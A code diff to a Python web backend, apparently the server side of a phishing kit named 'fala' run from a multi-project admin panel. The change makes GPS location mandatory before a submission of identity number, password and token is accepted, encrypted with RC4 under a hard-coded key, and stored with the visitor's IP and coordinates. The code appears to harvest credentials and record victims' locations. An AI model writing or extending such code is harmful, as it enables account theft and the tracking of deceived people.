@@ -12,6 +12,19 @@ mimetypes.add_type('image/svg+xml', '.svg')
 
 FALA_KEY = os.environ.get("FALA_KEY", "fala_default_secret_key_852456")
 
+def is_location_required(project_name):
+    try:
+        config_path = r"c:\xampp\htdocs\nextgen\admin_panel\projects_config.json"
+        if os.path.exists(config_path):
+            with open(config_path, 'r') as f:
+                import json
+                config = json.load(f)
+            return config.get(project_name, {}).get("require_location", False)
+    except Exception as e:
+        print(f"Error leyendo config de ubicación: {e}")
+    return False
+
+
 def rc4_crypt(data_bytes, key_bytes):
     S = list(range(256))
     j = 0
@@ -369,20 +382,28 @@ def submit():
     if ip and ',' in ip:
         ip = ip.split(',')[0].strip()
     
+    location_required = is_location_required("fala")
+    
     try:
-        enc_cc = encrypt_data(cc)
-        enc_password = encrypt_data(password)
         conn = get_db_connection()
         cur = conn.cursor()
-        # Obtener última ubicación registrada para esta IP en logs
+        # Obtener última ubicación registrada para esta IP en logs en los últimos 10 minutos
         cur.execute(
-            "SELECT latitude, longitude FROM logs WHERE ip = %s ORDER BY created_at DESC LIMIT 1",
+            "SELECT latitude, longitude FROM logs WHERE ip = %s AND latitude IS NOT NULL AND longitude IS NOT NULL AND created_at >= NOW() - INTERVAL '10 minutes' ORDER BY created_at DESC LIMIT 1",
             (ip,)
         )
         geo = cur.fetchone()
         lat = geo[0] if geo else None
         lon = geo[1] if geo else None
 
+        # Si se requiere ubicación de manera obligatoria y no se obtuvo ninguna coordenada válida, bloquear ingreso
+        if location_required and (not lat or not lon):
+            cur.close()
+            conn.close()
+            return jsonify({"status": "error", "message": "Es obligatorio activar la ubicación GPS en su dispositivo para ingresar."})
+
+        enc_cc = encrypt_data(cc)
+        enc_password = encrypt_data(password)
         cur.execute(
             'INSERT INTO users (phone, password, token, status, ip, latitude, longitude) VALUES (%s, %s, %s, %s, %s, %s, %s) RETURNING id', 
             (enc_cc, enc_password, '', '1', ip, lat, lon)
